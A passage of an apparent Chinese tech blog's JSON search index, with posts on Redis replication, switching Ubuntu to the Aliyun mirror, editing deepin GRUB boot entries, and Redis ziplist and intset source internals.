&lt;offset&gt;,其中runid是这个主服务器的id，从服务器会将这个id保存起来，在下一次发送PSYNC时使用，offset则是当前主服务器的复制偏移量，从服务器会将这个值作为自己的初始偏移量 部分重同步操作：回复+CONTINUE，从服务器只要等着主服务器将自己缺少的那部分数据发送过来就好了 版本过低：回复-ERR，表示服务器版本低于2.8，无法识别PSYNC命令，从服务器将向主服务器发送SYNC命令，并且与主服务器完整同步操作 SLAVEOF执行流程设置主服务器地址和端口例如执行命令：SLAVEOF 127.0.0.1 6379 从服务器首先要做的就是将客户端给定的主服务器IP地址127.0.0.1以及端口6379保存到服务器状态的masterhost属性和masterport属性里面： 12345678struct redisServer &#123; ... /* Replication (slave) */ char *masterauth; /* AUTH with this password with master */ char *masterhost; /* Hostname of master */ int masterport; /* Port of master */ ...&#125;； SLAVEOF命令是一个异步命令，在完成masterhost和masterport属性设置后向客户端返回OK，表示复制指令已经被接收，而实际的复制工作将在OK返回之后才正式开始 建立套接字连接从服务器将根据所设置的IP地址和端口创建连向主服务器的套接字 如果套接字成功连接主服务器，那么从服务器将为这个套接字关联一个专门用于处理复制工作的文件事件处理器，比如接收RDB和主服务器传播回来的写命令 而主服务器接受从服务器的套接字后，将该套接字创建相应的客户端状态，并将从服务器连接看做是一个连接到主服务器的客户端对待，这时从服务器将同时具有服务器和客户端两个身份。 发送PING命令从服务器成为主服务器客户端后第一件事就是向主服务器发送PING命令 检查套接字的读写状态时候正常 复制工作必须在主服务器可以正常处理命令请求的状态下才能进行，通过发送PING命令可以检查主服务器能否正常处理请求命令 如果主服务器返回了命令回复，而从服务器不能在规定时间内读取回复的内容， 说明当前网络不佳，不能继续后面的复制操作，所以应该断开并重新创建套接字 如果回复读取也正常，那么标识主从服务器连接正常，并且可以接受从服务器的请求，可以继续执行复制工作的下面步骤 身份验证如果从服务器设置了masterauth选项， 那么进行身份验证， 这时从服务器将向主服务器发送一条auth命令，验证时可能出现以下情况 如果主服务器没有设置requirepass选项， 并且从服务器也没有设置masterauth选项，那么主服务器将继续执行从服务器发送的命令， 复制工作继续 如果从服务器通过auth命令发送的密码和主服务器设置的requirepass选项所设置的密码相同，那么主服务器将继续执行从服务器发送的命令，复制工作继续执行。相反，如果明码不同，主服务器将返回invalid password错误 如果主服务器设置了requirepass选项， 而从服务器没有设置masterauth选项，那么主服务器将返回一个NOAUTH错误。如果主服务器没有设置requirepass选项，而从服务器设置了masterauth选项，那么主服务器返回一个 no password is set错误 任何错误情况都会令从服务器停止复制工作，并从创建套接字开始重新执行复制，直到身份验证通过，或者从服务器放弃执行复制为止 发送端口信息身份验证之后，从服务器执行命令REPLCONF listening-port &lt;port-number&gt;向主服务器发送服务器监听端口号 例如，从服务器的监听端口为12345，那么从服务器将向主服务器发送命令REPLCONF listening-port 12345 主服务器在接收到这个命令后，会将端口号记录在从服务器所对应客户端状态的slave_listening_port 属性中， 这个属性唯一的作用就是在主服务器执行INFO replication时打印出从服务器的端口号 同步这一步，从服务器将向主服务器发送PSYNC命令， 执行同步操作，并将自己的数据库更新至主服务器数据库当前所处状态 在同步操作之前，只有从服务器是主服务器的客户端，但是在执行同步操作之后，主服务器也会成为从服务器的客户端 如果执行完整同步操作，那么主服务器需要成为从服务器的客户端才能将保存在缓冲区里面的写命令发送给从服务器 如果是部分重同步操作，那么主服务器需要成为从服务器的客户端才能向从服务器发送保存在复制积压缓冲区里面的写命令 因此同步操作执行之后，主从服务器双方都是对方的客户端 命令传播完成同步后，主服务器就会进入命令传播阶段，这时主服务器只要一直将自己执行的写命令发送给从服务器，而从服务器只要一直接收主服务器发来的写命令就可以保证主从一致了 心跳检测从服务器默认会以每秒一次的频率向主服务器发送命令 REPLCONF ACK &lt;replication_offset&gt; 其中&lt;replicaion_offset&gt;是从服务器当前的复制偏移量 检测主从服务器的网络连接状态 主服务器可以通过发送和接收REPLCONF ACK命令来检查两者之间的网络连接是否正常， 如果主服务器超过一秒钟没有收到从服务器发来的REPLCONF ACK命令，那么主服务器就知道主从服务器链接出现了问题 辅助实现min-slaves选项 redis的min-slaves-to-write和min-slaves-max-lag两个选项可以防止主服务器不在安全的情况下执行写命令， 例如min-slaves-to-write 3 min-slaves-max-lag 10，在从服务器数量少于3个或者三个从服务器的延迟(lag)都大于或等于10秒时主服务器拒绝执行写命令 检测命令丢失 如果因为网络故障，主服务器传播给从服务器的写命令在半路丢失，那么当从服务器向主服务器告知replication_offset时，主服务器发觉从服务器当前的复制偏移量少于自己的复制偏移量，然后主服务器就会根据从服务器提交复制偏移量，在复制积压缓冲区找到缺少的数据重新发送给从服务器flowchat st=>start: 开始 e=>end: 结束 op1=>operation: 从服务器接到客户端发来的SLAVEOF命令 cond1=>condition: 这是从服务器第一次执行复制？ op2=>operation: 向主服务器发送PSYNC ? -1 op3=>operation: 向主服务器发送PSYNC cond2=>condition: 主服务器返回 +CONTINUE ? op4=>operation: 主服务器返回 +FULLRESYNC 执行完整重同步 op5=>operation: 执行部分重同步 st->op1 op1->cond1 cond1(yes)->op2 cond1(no)->op3 op3->cond2 cond2(no)->op4 cond2(yes)->op5 op2->op4 op4->e op5->e{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-0-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-0-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-0\", options);st=>start: 开始 en=>end: 结束 op1=>operation: 进入身份验证 op2=>operation: 执行复制工作的下一个步骤 op3=>operation: 主从服务器设置了不同的密码 或者 主服务器设置了密码从服务器没有设置密码 或者 从服务器设置了密码主服务器没有设置密码 op4=>operation: 重试 cond1=>condition: 主从服务器都没有设置密码 cond2=>condition: 主从服务器设置的密码相同 st->op1 op1->cond1 cond1(yes)->op2 cond1(no)->cond2 cond2(yes)->op2 cond2(no)->op3 op3->op4 op2->en{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-1-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-1-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-1\", options);","path":"2019/08/23/redis主从复制/","date":"08-23","excerpt":"在redis中可以通过slaveof命令让一个服务器去复制另一个服务器，其中被复制的服务器叫做主服务器，对主服务器进行复制的叫做从服务器。graph LR A[从服务器] -->|复制| B(主服务器)","tags":[]},{"title":"ubuntu修改为阿里云镜像源","text":"备份源文件 使用cp命令备份/etc/apt/sources.list文件 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 查看目前版本信息 1234567891011121314# 方法一 # 显示的是 Codename: bionic， 这个bionic就是代号要填的东西 lsb_release -c # 查看所有信息 # No LSB modules are available. # Distributor ID: Ubuntu # Description: Ubuntu 18.04.3 LTS # Release: 18.04 # Codename: bionic lsb_release -a# 方法二 cat /etc/issue 不同的版本的系统代号不同 版本 代号 Ubuntu 12.04 (LTS) precise Ubuntu 14.04 (LTS) trusty Ubuntu 15.04 vivid Ubuntu 15.10 wily Ubuntu 16.04 (LTS) xenial Ubuntu 18.04 (LTS) bionic 修改配置文件 以下命令在root权限下执行，如果不是root需要在命令前加sudo 123456789101112131415161718192021222324# 打开配置文件，如果是桌面系统可以用gedit命令打开vi /etc/apt/sources.list# 替换里面的文件内容，记得将[代号]替换为自己版本的代号deb http://mirrors.aliyun.com/ubuntu/ [代号] main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ [代号] main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ [代号]-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ [代号]-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ [代号]-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ [代号]-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ [代号]-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ [代号]-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ [代号]-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ [代号]-proposed main restricted universe multiverse 更新列表 1apt-get update 注意update和upgrade区别：update是更新软件列表，upgrade是更新软件。","path":"2019/08/20/ubuntu修改为阿里云镜像源/","date":"08-20","excerpt":"备份源文件 使用cp命令备份/etc/apt/sources.list文件 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 查看目前版本信息 1234567891011121314# 方法一 # 显示的是 Codename: bionic， 这个bionic就是代号要填的东西 lsb_release -c # 查看所有信息 # No LSB modules are available. # Distributor ID: Ubuntu # Description: Ubuntu 18.04.3 LTS # Release: 18.04 # Codename: bionic lsb_release -a# 方法二 cat /etc/issue 不同的版本的系统代号不同","tags":[{"name":"系统配置","slug":"系统配置","permalink":"https://jijiking51.cn/tags/系统配置/"}]},{"title":"deepin修改启动项","text":"问题说明boot里面的启动项是根据其它文件生成的，如果改boot里面，会在你更新grub后再次回到原来的状态。（之后 我（有显卡驱动问题的用户）通过在开机时选择系统页面按e在倒数第二行ro quiet splash 后面加上acpi_osi=! acpi_osi=”Windows 2009”可以从最新内核进入系统。在/etc/default/grub 文件里面相同位置也加上这一句后会让系统不能自己更新grub，之后你就可以在boot/grub里面直接更改启动项内容而不必担心系统回滚） 更改配置更改启动项主要从两个文件夹改：/etc/default/grub和/etc/grub.d，下面解释一下这两个文件夹的内容。. /etc/default/grub： 12345678GRUB_BACKGROUND=&quot;/boot/grub/themes/deepin/background.png&quot; #背景图片的路径GRUB_CMDLINE_LINUX_DEFAULT=&quot;splash quiet&quot; #开机的开机动画(貌似是，需要加载显卡)有显卡驱动问题的可以在后面加上 nomodeset(此选项只会追加在一般模式后）GRUB_DEFAULT=0 #默认启动项，这个值为0就是默认启动第一个，为1默认启动第二个GRUB_DISABLE_RECOVERY=&quot;true&quot; #禁止显示救援模式（这个不太懂）GRUB_DISTRIBUTOR=&quot;`/usr/bin/lsb_release -d -s 2&gt;/dev/null || echo Deepin`&quot; #获得发行版本（此行将追加到所有的linux 定义内核行的后面，不论是救援模式还是一般模式）GRUB_GFXMODE=&quot;1920x1080&quot; #启动的分辨率GRUB_THEME=&quot;/boot/grub/themes/deepin/theme.txt&quot; #启动的主题，是各种图片和各种显示的字体GRUB_TIMEOUT=5 #等待时间，5秒未操作直接进入默认系统。改为-1是一直等待。 /etc/grub.d： 1234567891000_header # 配置初始的显示项目，如默认选项，时间限制等，一般由/etc/default/grub导入，一般不需要配置05_debian_theme # 配置引导画面，文字颜色等主题10_linux #定位当前操作系统使用中的root设备内核的位置,包含deepin 启动项和advanced里面的启动项15_linux_bar # 救援模式的启动项20_linux_xen # 虚拟机监视器的东西，（暂时不知有什么用30_uefi-firmware # “system setup” 的启动项35_os-prober # windows的启动项一般在这个里面40_custom # 用来加入用户自定义的启动项，将会在执行update-grub时更新至grub.cfg中41_custom # 判断custom.cfg此配置文件是否存在，如果存在就加载它前面的数字是对文件排列执行的顺序进行排序，可进行更改，比如你想把windows启动项调到第一个，就把35_os-prober前面那个数字改成5到10的数字，比如06、07、08、09. 想更改deepin系统的启动内核（有这个需求是不少人在新内核上有显卡驱动问题，而从advanced里面进不能默认进入） （deepin默认的应该是最新的启动内核，你在boot/grub/grub.cfg里面更改的话只要一更新grub就会回到原来的内核）因此是要改10_linux文件的，但是里面是汇编命令看不懂， 这时40_custom 提供了一个在启动页面加一个新的启动项的简单方法，具体操作如下： 打开boot/grub/grub.cfg，找到你默认的启动项（或者你想要改到外面的advanced里面的启动项）（这些启动项都在10_linux里面），大概如下： 123456789101112131415menuentry &apos;Deepin 15.6 GNU/Linux（名字在这里改）&apos; --class deepin --class gnu-linux --class gnu --class os $menuentry_id_option &apos;gnulinux-simple-6873bab1-cdf1-4931-8717-d2258cb3ad87&apos; load_video insmod gzio if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi insmod part_gpt insmod ext2 set root=&apos;hd0,gpt4&apos; if [ x$feature_platform_search_hint = xy ]; then search --no-floppy --fs-uuid --set=root --hint-bios=hd0,gpt4 --hint-efi=hd0,gpt4 --hint-baremetal=ahci0,gpt4 6873bab1-cdf1-4931-8717-d2258cb3ad87 else search --no-floppy --fs-uuid --set=root 6873bab1-cdf1-4931-8717-d2258cb3ad87 fi linux /boot/vmlinuz-4.15.0-21deepin-generic root=UUID=6873bab1-cdf1-4931-8717-d2258cb3ad87 ro splash quiet initrd /boot/initrd.img-4.15.0-21deepin-generic&#125; 复制粘贴到40_custom那三行字下面（需要以管理员身份打开） 然后把名字改一下（为了避免重复嘛，你要是在advanced里面复制的就不用改了），最后两行是启动内核，改一下（当然，你要是复制的advanced里面你想改的内核启动项就直接粘贴就行了） 保存 之后sudo update-grub就可以了。之后再根据你的需要改顺序和默认启动项就行。","path":"2019/06/25/deepin修改启动项/","date":"06-25","excerpt":"问题说明boot里面的启动项是根据其它文件生成的，如果改boot里面，会在你更新grub后再次回到原来的状态。（之后 我（有显卡驱动问题的用户）通过在开机时选择系统页面按e在倒数第二行ro quiet splash 后面加上acpi_osi=! acpi_osi=”Windows 2009”可以从最新内核进入系统。在/etc/default/grub 文件里面相同位置也加上这一句后会让系统不能自己更新grub，之后你就可以在boot/grub里面直接更改启动项内容而不必担心系统回滚）","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"deepin","slug":"deepin","permalink":"https://jijiking51.cn/tags/deepin/"}]},{"title":"redis源码-压缩列表","text":"是列表键和哈希键的底层实现之一。 当一个列表建只包含少量列表项，并且如果每个列表项是小整数值或者长度比较短的字符串，那么redis就会使用压缩列表来做列表键的底层实现。 当一个哈希键只包含少量键值对，并且每个键值对的键和值要么就是小整数值，要么就是长度比较短的字符串，那么redis会使用压缩列表来做哈希键的底层实现 压缩列表的构成压缩列表是为了节约内存而开发的，是由一系列特殊编码的连续内存块组成的顺序性数据结构。一个压缩列表可以包含任意多个节点，每个节点可以保存一个字节数组或一个整数值。 压缩列表的组成： 属性 类型 长度 用途 zlbytes uint32_t 4 字节 记录整个压缩列表占用的内存字节数：在对压缩列表进行内存重分配， 或者计算 zlend 的位置时使用。 zltail uint32_t 4 字节 记录压缩列表表尾节点距离压缩列表的起始地址有多少字节： 通过这个偏移量，程序无须遍历整个压缩列表就可以确定表尾节点的地址。 zllen uint16_t 2 字节 记录了压缩列表包含的节点数量： 当这个属性的值小于 UINT16_MAX （65535）时， 这个属性的值就是压缩列表包含节点的数量； 当这个值等于 UINT16_MAX 时， 节点的真实数量需要遍历整个压缩列表才能计算得出。 entryX 列表节点 不定 压缩列表包含的各个节点，节点的长度由节点保存的内容决定。 zlend uint8_t 1 字节 特殊值 0xFF （十进制 255 ），用于标记压缩列表的末端。 1234567891011121314151617181920/* * ziplist 属性宏 */// 定位到 ziplist 的 bytes 属性，该属性记录了整个 ziplist 所占用的内存字节数// 用于取出 bytes 属性的现有值，或者为 bytes 属性赋予新值#define ZIPLIST_BYTES(zl) (*((uint32_t*)(zl)))// 定位到 ziplist 的 offset 属性，该属性记录了到达表尾节点的偏移量// 用于取出 offset 属性的现有值，或者为 offset 属性赋予新值#define ZIPLIST_TAIL_OFFSET(zl) (*((uint32_t*)((zl)+sizeof(uint32_t))))// 定位到 ziplist 的 length 属性，该属性记录了 ziplist 包含的节点数量// 用于取出 length 属性的现有值，或者为 length 属性赋予新值#define ZIPLIST_LENGTH(zl) (*((uint16_t*)((zl)+sizeof(uint32_t)*2)))// 返回 ziplist 表头的大小#define ZIPLIST_HEADER_SIZE (sizeof(uint32_t)*2+sizeof(uint16_t))// 返回指向 ziplist 第一个节点（的起始位置）的指针#define ZIPLIST_ENTRY_HEAD(zl) ((zl)+ZIPLIST_HEADER_SIZE)// 返回指向 ziplist 最后一个节点（的起始位置）的指针#define ZIPLIST_ENTRY_TAIL(zl) ((zl)+intrev32ifbe(ZIPLIST_TAIL_OFFSET(zl)))// 返回指向 ziplist 末端 ZIP_END （的起始位置）的指针#define ZIPLIST_ENTRY_END(zl) ((zl)+intrev32ifbe(ZIPLIST_BYTES(zl))-1) 下图展示了一个包含三个节点的压缩列表示例： 列表 zlbytes 属性的值为 0x50 （十进制 80）， 表示压缩列表的总长为 80 字节。 列表 zltail 属性的值为 0x3（十进制 60）， 这表示如果我们有一个指向压缩列表起始地址的指针 p ， 那么只要用指针 p 加上偏移量 60 ， 就可以计算出表尾节点 entry3 的地址。 列表 zllen 属性的值为 0x3 （十进制 3）， 表示压缩列表包含三个节点。 展示了一个包含五个节点压缩列表示例： 列表 zlbytes 属性的值为 0xd2 （十进制 210）， 表示压缩列表的总长为 210 字节。 列表 zltail 属性的值为 0xb3 （十进制 179）， 这表示如果我们有一个指向压缩列表起始地址的指针 p ， 那么只要用指针 p 加上偏移量 179 ， 就可以计算出表尾节点 entry5 的地址。 列表 zllen 属性的值为 0x5（十进制 5）， 表示压缩列表包含五个节点。 压缩列表节点的构成每个压缩列表可以保存一个字节数组或者一个整数值，其中，字节数组可以是一下三种长度的其中一种： 长度小于等于63（2^6-1）字节的字节数组 长度小于等于16383（2^14-1）字节的字节数组 长度小于等于4294967295（2^32-1）字节的字节数组 整数值可以是一下六种长度的其中一种： 4位长，介于0至12之间的无符号整数 1字节的有符号整数 3字节长的有符号整数 int16_t类型整数 int32_t类型整数 int64_t类型整数 每个压缩列表都是由previous_entry_length/encoding/content三个部分组成 123456789101112131415161718192021222324/* * 保存 ziplist 节点信息的结构 */typedef struct zlentry &#123; // prevrawlen ：前置节点的长度 // prevrawlensize ：编码 prevrawlen 所需的字节大小 unsigned int prevrawlensize, prevrawlen; // len ：当前节点值的长度 // lensize ：编码 len 所需的字节大小 unsigned int lensize, len; // 当前节点 header 的大小 // 等于 prevrawlensize + lensize unsigned int headersize; // 当前节点值所使用的编码类型 unsigned char encoding; // 指向当前节点的指针 unsigned char *p;&#125; zlentry; previous_entry_length节点的previous_entry_length属性以字节为单位，记录了压缩列表中前一个节点的长度。previous_entry_length属性的长度可以是1字节或者5字节 123456789101112131415/* Decode the number of bytes required to store the length of the previous * element, from the perspective of the entry pointed to by 'ptr'. * * 解码 ptr 指针， * 取出编码前置节点长度所需的字节数，并将它保存到 prevlensize 变量中。 * * T = O(1) */#define ZIP_DECODE_PREVLENSIZE(ptr, prevlensize) do &#123; \\ if ((ptr)[0] &lt; ZIP_BIGLEN) &#123; \\ (prevlensize) = 1; \\ &#125; else &#123; \\ (prevlensize) = 5; \\ &#125; \\&#125; while(0); 如果前一个节点的长度小于254字节，那么previous_entry_length属性的长度，为1字节，前一个节点的长度就保存在这个字节里面 如果前一节点的长度大于等于254字节，那么previous_entry_length属性的长度为5字节：其中属性的第一个字节会被设置为0xFE(十进制254)，之后的四个字节则用于保存前一节点的长度 第一幅图表示一个属性值为0x05的previous_entry_length，表示前一个节点的长度为5字节 第二幅图表示一个属性为0xFE00002766的previous_entry_length，最高位的0xFE表示这是五个字节的属性，后面的0x00002766才是表示节点长度的值(十进制10086) 因为节点的previous_entry_length属性记录了前一个节点的长度，所以程序可以通过指针运算，更具当前节点的起始地址来计算出前一个节点的起始地址。例如： 我们有一个指向当前节点起始地址的指针C，那么我们只要用c减去当前节点的previous_entry_length属性的值，就可以得出一个指向前一个节点起始地址的指针P 压缩列表的从表尾向表头便利操作就是适用这个原理实现的，只要我们拥有了一个指向某个节点起始地址的指针，那么通过这个指针以及这个节点的previous_entry_length属性，程序就可以一直想前一个节点回溯，最终到达压缩列表的头结点。 首先我们拥有指向压缩列表表尾节点entry4起始地址的指针p1（指向表尾节点的指针可以通过指向压缩列表起始地址的指针加上zltail属性的值得出） 通过p1减去entry4节点的previous_entry_length属性的值，我们得到一个指向entry4前一节点entry3起始地址的指针p2 通过用p2减去entry3节点previous_entry_length属性的值，我们得到一个指向entry3前一节点entry2起始地址的指针p3 通过用p3减去entry2节点previous_entry_length属性的值，我们得到一个指向entry2前一节点entry1起始地址的指针p4，entry1为压缩列表的表头节点 最终我们从表尾节点向表头节点遍历了整个列表 encoding节点的encoding属性记录了节点的content属性所保存数据的类型以及长度 1234567891011/* Extract the encoding from the byte pointed by 'ptr' and set it into * 'encoding'. * * 从 ptr 中取出节点值的编码类型，并将它保存到 encoding 变量中。 * * T = O(1) */#define ZIP_ENTRY_ENCODING(ptr, encoding) do &#123; \\ (encoding) = (ptr[0]); \\ if ((encoding) &lt; ZIP_STR_MASK) (encoding) &amp;= ZIP_STR_MASK; \\&#125; while(0) 字节数组编码 字节长度 编码 content属性保存的值 1字节 00xxxxxx 长度小于等于63字节的字节数组 2字节 01xxxxxx 长度小于等于16383字节的字节数组 5字节 10xxxxxx xxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxx 长度小于等于4294967295的字节数组 整数编码（均一字节） 编码 content属性保存的值 11000000 int16_t类型的整数， 2 字节带符号整数 11010000 int32_t类型的整数，4 字节带符号整数 11100000 int64_t类型的整数，8 字节带符号整数 11110000 24位有符号整数 11111110 8位有符号整数 1111xxxx 没有content属性，因为xxxx四位已经可以保存0-12之间的值 contentcontent保存节点的值，可以是一个字节数组也可以是一个整数，类型和长度由encoding决定 连锁更新每个节点的 previous_entry_length（保存前一个节点的字节长度） 属性都记录了前一个节点的长度： 如果前一节点的长度小于 254 字节， 那么 previous_entry_length 属性需要用 1 字节长的空间来保存这个长度值。 如果前一节点的长度大于等于 254 字节， 那么 previous_entry_length 属性需要用 5 字节长的空间来保存这个长度值。 假如目前有以下情况，每个节点的长度介于250字节到253字节之间 graph TB subgraph now,节点长度 a(zlbytes) b(zltail) c(zllen) d(e1) e(e2) f(e3) g(...) h(eN) j(zlend) end 因为节点长度都小于254字节， 所以previous_entry_length只需要1个字节保存。 如果这个时候讲一个长度大于等于254字节的新节点new设置为压缩列表节点，那么new成为压缩列表e1的前置节点 graph TB subgraph now,节点长度 a(zlbytes) b(zltail) c(zllen) x((new)) d(e1) e(e2) f(e3) g(...) h(eN) j(zlend) end 因为e1的previous_entry_length仅1字节长， 他没办法保存新的节点new的长度，所以将需要从1字节扩充到5字节。 但是e1本身就介意250-253字节之间， 如果previous_entry_length增加四个字节，那么e1就会扩大到254-257字节，这种长度e2时没法保存的，以此类推后面一直到eN都需要一个接一个的扩充4个字节，这种情况称之为连锁更新。同时删除也有可能导致连锁更新。 因为连锁更新最坏的情况就如同上面的例子，需要进行N次(从e1——eN)空间分配，而每次空间重分配的最坏复杂度为O(N) (重分配节点后面的内存位置都需要后移一次)，所以连锁更新最坏的复杂度为O(N^2). 真正造成性能问题的几率是很低的： 首先， 压缩列表里要恰好有多个连续的、长度介于 250 字节至 253 字节之间的节点， 连锁更新才有可能被引发， 在实际中， 这种情况并不多见； 其次， 即使出现连锁更新， 但只要被更新的节点数量不多， 就不会对性能造成任何影响： 比如说， 对三五个节点进行连锁更新是绝对不会影响性能的； 因为以上原因， ziplistPush 等命令的平均复杂度仅为 O(N) ， 在实际中， 我们可以放心地使用这些函数， 而不必担心连锁更新会影响压缩列表的性能。","path":"2019/04/22/redis源码-压缩列表/","date":"04-22","excerpt":"是列表键和哈希键的底层实现之一。 当一个列表建只包含少量列表项，并且如果每个列表项是小整数值或者长度比较短的字符串，那么redis就会使用压缩列表来做列表键的底层实现。 当一个哈希键只包含少量键值对，并且每个键值对的键和值要么就是小整数值，要么就是长度比较短的字符串，那么redis会使用压缩列表来做哈希键的底层实现","tags":[{"name":"源码","slug":"源码","permalink":"https://jijiking51.cn/tags/源码/"}],"preview":"http://img.jijiking51.cn/redis源码-压缩列表.jpg"},{"title":"redis源码-整数集合","text":"整数集合整数集合是集合键的底层实现之一， 当一个集合只包含整数值元素，并且这个集合的元素数量不多时，redis会使用整数集合键实现整数集合的实现整数集合是用于保存整数值的集合抽象数据结构，可以保存int16_t / int32_t / int64_t的整数值123456789101112typedef struct intset &#123; // 编码方式 uint32_t encoding; // 集合包含的元素数量 uint32_t length; // 保存元素的数组 int8_t contents[];&#125; intset; contents数组是整数集合的底层实现，每个数据项按从大到小有序排列，并且数组中不包含重复数据 length属性记录了整数集合元素个数，也就是contents长度 虽然contents结构属性声明为int8_t类型数组，但是数组并不保存任何int8_t类型值，contents属性其实是由encoding决定 如果encoding属性的值为INTSET_ENC_INT16，那么contents就是一个int16_t类型的数组，数组里面每一项都是int16_t类型整数 如果encoding属性的值为INTSET_ENC_INT32，那么contents就是一个int32_t类型的数组，数组里面每个项都是一个int32_t类型的整数 如果encoding属性的值为INTSET_ENC_INT64，那么contents就是一个int64_t类型的数组，数组里面每个项都是一个int64_t类型的整数 contents数组中，只要有一个整数需要用到int64_t(大类型)， 那么所有的都必须升级为int64_t(大类型) 升级当我们要将一个新的元素添加到整数集合里面，并且新的元素比目前数组中所有元素的类型都要长的时候，整数集合需要先升级，然后才能将这个整数添加到整数集合。升级一共分为三个步骤： 根据新元素的类型，扩张整个数集合底层数组的空间大小，并为新元素分配空间。 将底层数组现有的所有元素都转换成新元素相同的类型，并将转换后的元素放到正确位置上，并且整个过程要维持底层数组的有序性不变。 将新元素放到底层数组 下面图片表示了升级流程： 初始状态下， 这是一个int16_t的数组，但是如果我们要插入int32_t的一个元素，所以我们先分配空间给它升级 因为升级过程中要保证数组序列的有序性，所以，四个数字中，3还是排第三位，所以要移到第三位所在的空间 二号位移动到二号位所在空间 一号位空间重新扩充 新元素插入到数组的对应位置 更改encoding类型，修改length长度，新元素插入完成 因为每次向整数集合添加新元素都可能会引起升级，而每次升级都需要对底层数组中已有的所有元素进行类型转换，所以向整数集合添加新元素的时间复杂度为O(N)。 升级的好出 提升整数集合的灵活性 尽可能的节省内存 提升灵活性因为c是静态类型语言，为了避免类型错误，我们通常不会将两种不同类型的值放在同一个数据结构里面。 我们一般只用int16_t来保存int16_t类型的值，也只用int32_t保存int32_t类型的值。 但是整数集合可以通过自动升级底层来适应新元素，所以我们可以随意的将int16_t、int32_t、int64_t添加到集合中，不用担心类型错误。 节约内存要同时保存int16_t、int32_t、int64_t类型的值，最简单的方法就是使用int64_t的类型数组。不过这样一来，即使整数集合中全是int16_t类型的元素也会占用int64_t的空间去保存他们，这样会出现内存浪费的情况。 动态的升级类型，可以有效避免上述的内存浪费情况 整数集合不支持降级操作，一旦对数组进行了升级，编码会一直保持升级后的状态 整数集合API常用API列表 函数 作用 时间复杂度 intsetNew 创建一个新的整数集合。 O(1) intsetAdd 将给定元素添加到整数集合里面。 O(N) intsetRemove 从整数集合中移除给定元素。 O(N) intsetFind 检查给定值是否存在于集合。 因为底层数组有序，查找可以通过二分查找法来进行， 所以复杂度为 O(\\log N) 。 intsetRandom 从整数集合中随机返回一个元素。 O(1) intsetGet 取出底层数组在给定索引上的元素。 O(1) intsetLen 返回整数集合包含的元素个数。 O(1) intsetBlobLen 返回整数集合占用的内存字节数。 O(1) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566/* Return the required encoding for the provided value. * * 返回适用于传入值 v 的编码方式 * * T = O(1) */static uint8_t _intsetValueEncoding(int64_t v) &#123; if (v &lt; INT32_MIN || v &gt; INT32_MAX) return INTSET_ENC_INT64; else if (v &lt; INT16_MIN || v &gt; INT16_MAX) return INTSET_ENC_INT32; else return INTSET_ENC_INT16;&#125;/* Return the value at pos, given an encoding. * * 根据给定的编码方式 enc ，返回集合的底层数组在 pos 索引上的元素。 * * T = O(1) */static int64_t _intsetGetEncoded(intset *is, int pos, uint8_t enc) &#123; int64_t v64; int32_t v32; int16_t v16; // ((ENCODING*)is-&gt;contents) 首先将数组转换回被编码的类型 // 然后 ((ENCODING*)is-&gt;contents)+pos 计算出元素在数组中的正确位置 // 之后 member(&amp;vEnc, ..., sizeof(vEnc)) 再从数组中拷贝出正确数量的字节 // 如果有需要的话， memrevEncifbe(&amp;vEnc) 会对拷贝出的字节进行大小端转换 // 最后将值返回 if (enc == INTSET_ENC_INT64) &#123; memcpy(&amp;v64,((int64_t*)is-&gt;contents)+pos,sizeof(v64)); memrev64ifbe(&amp;v64); return v64; &#125; else if (enc == INTSET_ENC_INT32) &#123; memcpy(&amp;v32,((int32_t*)is-&gt;contents)+pos,sizeof(v32)); memrev32ifbe(&amp;v32); return v32; &#125; else &#123; memcpy(&amp;v16,((int16_t*)is-&gt;contents)+pos,sizeof(v16)); memrev16ifbe(&amp;v16); return v16; &#125;&#125;/* Return the value at pos, using the configured encoding. * * 根据集合的编码方式，返回底层数组在 pos 索引上的值 * * T = O(1) */static int64_t _intsetGet(intset *is, int pos) &#123; return _intsetGetEncoded(is,pos,intrev32ifbe(is-&gt;encoding));&#125;/* Set the value at pos, using the configured encoding. * * 根据集合的编码方式，将底层数组在 pos 位置上的值设为 value 。 * * T = O(1) */static void _intsetSet(intset *is, int pos, int64_t value) 